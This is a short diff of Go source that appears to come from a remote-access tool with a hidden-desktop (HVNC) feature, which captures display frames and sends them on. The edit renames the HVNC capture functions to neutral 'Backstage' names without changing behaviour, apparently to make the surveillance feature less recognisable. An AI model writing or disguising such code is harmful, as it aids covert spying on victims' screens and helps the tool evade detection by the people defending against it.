@@ -1465,13 +1465,13 @@ func NowHVNC(ctx context.Context, env *rt.Env) error {
 	if env.Cfg.DisableCapture {
 		return sendBlackFrameHVNC(ctx, env)
 	}
-	if !supportsHVNCCapture() {
+	if !supportsBackstageCapture() {
 		return nil
 	}
 	return captureAndSendHVNC(ctx, env)
 }
 
-func supportsHVNCCapture() bool {
+func supportsBackstageCapture() bool {
 	count := HVNCMonitorCount()
 	return count > 0
 }
@@ -1490,7 +1490,7 @@ func captureAndSendHVNC(ctx context.Context, env *rt.Env) error {
 	}
 
 	t0 := time.Now()
-	img, err := safeHVNCCaptureDisplay(display)
+	img, err := safeBackstageCaptureDisplay(display)
 	if err != nil {
 		log.Printf("hvnc capture: capture failed: %v (sending black frame)", err)
 		return sendBlackFrameHVNC(ctx, env)
@@ -1531,11 +1531,11 @@ func captureAndSendHVNC(ctx context.Context, env *rt.Env) error {
 	return err
 }
 
-func safeHVNCCaptureDisplay(display int) (*image.RGBA, error) {
+func safeBackstageCaptureDisplay(display int) (*image.RGBA, error) {
 	defer func() {
 		_ = recover()
 	}()
-	img, err := hvncCaptureDisplay(display)
+	img, err := BackstageCaptureDisplay(display)
 	if err != nil {
 		return nil, err
 	}
